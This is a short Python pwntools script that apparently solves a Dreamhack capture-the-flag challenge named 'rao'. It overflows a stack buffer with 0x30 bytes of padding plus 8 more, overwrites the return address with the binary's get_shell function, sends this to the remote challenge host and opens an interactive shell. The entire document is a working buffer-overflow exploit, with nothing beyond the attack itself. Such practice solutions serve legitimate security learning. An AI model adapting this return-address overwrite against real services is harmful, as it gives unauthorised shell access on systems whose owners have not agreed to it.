from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

#p = process('./rao')
e = ELF("./rao")
p = remote("host3.dreamhack.games", "14214")
payload = b'A' * 0x30
payload += b'B' * 0x8
payload += p64(e.sym['get_shell'])

print(payload)

p.sendlineafter(b'Input: ', payload)
p.interactive()